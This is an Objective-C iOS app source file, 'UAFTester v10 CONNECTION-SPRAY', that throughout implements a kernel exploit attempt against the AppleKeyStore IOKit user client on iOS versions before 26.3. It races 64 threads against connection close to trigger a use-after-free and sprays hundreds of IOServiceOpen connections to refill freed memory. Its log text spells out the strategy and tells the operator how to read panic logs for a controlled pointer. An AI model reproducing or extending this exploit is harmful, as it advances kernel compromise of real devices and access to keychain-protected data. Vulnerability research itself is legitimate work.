//
//  ViewController.m
//  UAFTester
//
//  v10 CONNECTION-SPRAY - Spray using IOServiceOpen connections
//  Theory: Gate objects allocated during IOServiceOpen, not CallMethod
//

#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   64
#define MAX_ATTEMPTS 300

// ========== CONNECTION-BASED SPRAY ==========
#define SPRAY_PHASE_1_CONNECTIONS  400  // Initial spray
#define SPRAY_PHASE_2_CONNECTIONS  200  // Fill freed slots
// ===========================================

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;

// ========== SPRAY CONNECTIONS ==========
static io_connect_t g_spray_conns_p1[SPRAY_PHASE_1_CONNECTIONS];
static io_connect_t g_spray_conns_p2[SPRAY_PHASE_2_CONNECTIONS];
static int g_spray_count_p1 = 0;
static int g_spray_count_p2 = 0;
// =======================================

static void *racer_thread(void *arg) {
    (void)arg;
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        ;
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        uint64_t input[1] = {0};
        uint32_t out_cnt  = 0;
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            break;
        }
    }
    return NULL;
}

// ========== CONNECTION SPRAY FUNCTIONS ==========

static int connection_spray_phase(io_service_t svc, void(^log_callback)(NSString *), int phase) {
    kern_return_t kr;
    int fail_count = 0;
    
    io_connect_t *conns = (phase == 1) ? g_spray_conns_p1 : g_spray_conns_p2;
    int *count = (phase == 1) ? &g_spray_count_p1 : &g_spray_count_p2;
    int target = (phase == 1) ? SPRAY_PHASE_1_CONNECTIONS : SPRAY_PHASE_2_CONNECTIONS;
    
    log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Opening %d connections...", phase, target]);
    
    // Just open connections - the act of opening allocates gate objects!
    for (int i = 0; i < target; i++) {
        kr = IOServiceOpen(svc, mach_task_self(), 0, &conns[i]);
        
        if (kr != KERN_SUCCESS) {
            if (kr == 0xe00002c7) { // kIOReturnNoResources
                log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Resource limit at %d", phase, i]);
                *count = i;
                break;
            } else {
                fail_count++;
                if (fail_count > 10) {
                    *count = i - fail_count;
                    return -1;
                }
            }
            conns[i] = IO_OBJECT_NULL;
            continue;
        }
        
        if ((i + 1) % 100 == 0) {
            log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Progress: %d/%d", phase, i + 1, target]);
        }
    }
    
    if (*count == 0) {
        *count = target;
    }
    
    log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Complete: %d connections opened", phase, *count]);
    
    if (*count < 50) {
        return -1;
    }
    
    return 0;
}

static void connection_spray_cleanup(void(^log_callback)(NSString *), int phase) {
    io_connect_t *conns = (phase == 1) ? g_spray_conns_p1 : g_spray_conns_p2;
    int *count = (phase == 1) ? &g_spray_count_p1 : &g_spray_count_p2;
    
    if (*count > 0) {
        log_callback([NSString stringWithFormat:@"[CLEANUP P%d] Closing %d connections", phase, *count]);
        
        for (int i = 0; i < *count; i++) {
            if (conns[i] != MACH_PORT_NULL && conns[i] != IO_OBJECT_NULL) {
                IOServiceClose(conns[i]);
                mach_port_deallocate(mach_task_self(), conns[i]);
                conns[i] = MACH_PORT_NULL;
            }
        }
        
        *count = 0;
        log_callback([NSString stringWithFormat:@"[CLEANUP P%d] Done", phase]);
    }
}

// Trigger UAF without holding references
static int trigger_uaf_and_release(void(^log_callback)(NSString *)) {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (svc == IO_OBJECT_NULL)
        return -1;
    
    io_connect_t temp_conn;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &temp_conn);
    IOObjectRelease(svc);
    
    if (kr != KERN_SUCCESS || temp_conn == IO_OBJECT_NULL)
        return -1;
    
    // Trigger UAF
    IOServiceClose(temp_conn);
    
    // Give racing threads time to hit the window
    usleep(5000);
    
    // Deallocate - this creates the freed slot!
    mach_port_deallocate(mach_task_self(), temp_conn);
    
    return 0;
}

// ==========================================

static int run_attempt(void) {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (svc == IO_OBJECT_NULL)
        return -1;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL)
        return -1;

    atomic_store_explicit(&g_phase, 0, memory_order_release);
    atomic_store_explicit(&g_calls, 0, memory_order_relaxed);
    atomic_store_explicit(&g_errors, 0, memory_order_relaxed);

    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_create(&threads[i], NULL, racer_thread, NULL);

    atomic_store_explicit(&g_phase, 1, memory_order_release);
    usleep(100);

    IOServiceClose(g_conn);
    atomic_store_explicit(&g_phase, 2, memory_order_release);
    usleep(5000);

    atomic_store_explicit(&g_phase, 3, memory_order_release);
    for (int i = 0; i < NUM_RACERS; i++)
        pthread_join(threads[i], NULL);

    mach_port_deallocate(mach_task_self(), g_conn);
    g_conn = IO_OBJECT_NULL;
    return 0;
}

@interface ViewController ()
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UILabel    *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) BOOL        running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;
    [self buildUI];
}

- (void)buildUI {
    UILabel *title = [[UILabel alloc] init];
    title.text = @"AppleKeyStoreUserClient\nclose() UAF + HEAP SPRAY";
    title.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
    title.textColor = UIColor.whiteColor;
    title.textAlignment = NSTextAlignmentCenter;
    title.numberOfLines = 2;
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    UILabel *subtitle = [[UILabel alloc] init];
    subtitle.text = @"v10 CONNECTION-SPRAY: Direct gate targeting\niOS <26.3 RC";
    subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
    subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
    subtitle.textAlignment = NSTextAlignmentCenter;
    subtitle.numberOfLines = 2;
    subtitle.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:subtitle];

    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.triggerButton setTitle:@"TRIGGER UAF + SPRAY" forState:UIControlStateNormal];
    self.triggerButton.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:20];
    [self.triggerButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    self.triggerButton.layer.cornerRadius = 12;
    self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.triggerButton addTarget:self action:@selector(triggerTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.triggerButton];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:14];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] init];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [title.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [title.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [subtitle.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:8],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.triggerButton.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:24],
        [self.triggerButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.triggerButton.widthAnchor constraintEqualToConstant:280],
        [self.triggerButton.heightAnchor constraintEqualToConstant:56],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.triggerButton.bottomAnchor constant:16],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

- (void)appendLog:(NSString *)line {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
        [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
    });
}

- (void)setStatus:(NSString *)text color:(UIColor *)color {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
        self.statusLabel.textColor = color;
    });
}

- (void)triggerTapped {
    if (self.running) return;
    self.running = YES;
    self.logView.text = @"";
    self.triggerButton.enabled = NO;
    self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];

    [self appendLog:@"========================================"];
    [self appendLog:@"  UAF v10 CONNECTION-SPRAY"];
    [self appendLog:@"========================================"];
    [self appendLog:@"[*] NEW THEORY:"];
    [self appendLog:@"    Gate objects allocated during IOServiceOpen"];
    [self appendLog:@"    NOT during IOConnectCallMethod!"];
    [self appendLog:@"[*] STRATEGY:"];
    [self appendLog:@"    1. Open many connections (spray gates)"];
    [self appendLog:@"    2. Trigger UAF (free one gate)"];
    [self appendLog:@"    3. Open more connections (refill freed gate)"];
    [self appendLog:@"    4. Race UAF (hit refilled gate)"];
    [self appendLog:@""];
    [self setStatus:@"Initializing..." color:UIColor.yellowColor];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        io_service_t svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
        if (svc == IO_OBJECT_NULL) {
            [self appendLog:@"[-] AppleKeyStore service not found"];
            [self setStatus:@"Service not found" color:UIColor.redColor];
            [self finishRun];
            return;
        }
        [self appendLog:@"[+] AppleKeyStore service found"];
        [self appendLog:@""];
        
        // ========== PHASE 1: INITIAL CONNECTION SPRAY ==========
        [self appendLog:@">>> PHASE 1: INITIAL CONNECTION SPRAY"];
        [self setStatus:@"Spraying connections P1..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        int result = connection_spray_phase(svc, ^(NSString *msg) {
            [self appendLog:msg];
        }, 1);
        
        if (result < 0) {
            [self appendLog:@"[-] Phase 1 spray failed!"];
            [self setStatus:@"Spray failed" color:UIColor.redColor];
            IOObjectRelease(svc);
            connection_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; }, 1);
            [self finishRun];
            return;
        }
        
        [self appendLog:[NSString stringWithFormat:@"[+] Phase 1 complete: %d gates allocated", g_spray_count_p1]];
        [self appendLog:@""];
        
        // ========== PHASE 2: TRIGGER UAF (Create freed slot) ==========
        [self appendLog:@">>> PHASE 2: CREATE FREED GATE SLOTS"];
        [self setStatus:@"Triggering UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
        
        [self appendLog:@"[*] Triggering 10 UAFs to create freed slots..."];
        for (int i = 0; i < 10; i++) {
            trigger_uaf_and_release(^(NSString *msg) { [self appendLog:msg]; });
            usleep(2000);
        }
        
        [self appendLog:@"[+] UAF triggered, freed slots created"];
        [self appendLog:@""];
        
        // ========== PHASE 3: REFILL WITH MORE CONNECTIONS ==========
        [self appendLog:@">>> PHASE 3: REFILL FREED SLOTS"];
        [self setStatus:@"Refilling with P2 connections..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
        
        result = connection_spray_phase(svc, ^(NSString *msg) {
            [self appendLog:msg];
        }, 2);
        
        if (result < 0) {
            [self appendLog:@"[!] Phase 2 spray limited (may be OK)"];
        } else {
            [self appendLog:[NSString stringWithFormat:@"[+] Phase 2 complete: %d refill gates", g_spray_count_p2]];
        }
        
        [self appendLog:[NSString stringWithFormat:@"[+] Total gates: %d", g_spray_count_p1 + g_spray_count_p2]];
        [self appendLog:@""];
        
        usleep(50000); // 50ms settle
        
        IOObjectRelease(svc);
        
        // ========== PHASE 4: RACE UAF ==========
        [self appendLog:@">>> PHASE 4: RACE UAF"];
        [self appendLog:@"[*] Goal: Hit one of our refilled gates!"];
        [self setStatus:@"Racing UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];

        for (int i = 0; i < MAX_ATTEMPTS; i++) {
            int result = run_attempt();
            
            if (result < 0) {
                usleep(5000);
            } else {
                usleep(500);
            }

            if ((i + 1) % 20 == 0 || i == 0) {
                [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u",
                                 i + 1, atomic_load(&g_calls), atomic_load(&g_errors)]];
                [self setStatus:[NSString stringWithFormat:@"Racing %d/%d", i + 1, MAX_ATTEMPTS]
                          color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
            }
        }

        [self appendLog:@""];
        [self appendLog:@"========================================"];
        [self appendLog:@"  COMPLETED"];
        [self appendLog:@"========================================"];
        
        uint32_t final_calls = atomic_load(&g_calls);
        uint32_t final_errors = atomic_load(&g_errors);
        
        [self appendLog:[NSString stringWithFormat:@"[*] Total calls: %u", final_calls]];
        [self appendLog:[NSString stringWithFormat:@"[*] Port deaths: %u", final_errors]];
        
        if (final_errors > 0) {
            [self appendLog:@""];
            [self appendLog:@"✓✓✓ UAF TRIGGERED! ✓✓✓"];
            [self appendLog:@""];
            [self appendLog:@"CHECK PANIC LOG:"];
            [self appendLog:@"  If x16 still = 0x0020... → Need kernel analysis"];
            [self appendLog:@"  If x16 = gate pointer → SUCCESS!"];
            [self setStatus:@"UAF TRIGGERED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
        } else {
            [self appendLog:@"[*] No port deaths"];
            [self setStatus:@"Completed" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
        }
        
        // Cleanup
        [self appendLog:@""];
        connection_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; }, 1);
        connection_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; }, 2);
        
        [self finishRun];
    });
}

- (void)finishRun {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.running = NO;
        self.triggerButton.enabled = YES;
        self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
    });
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

@end
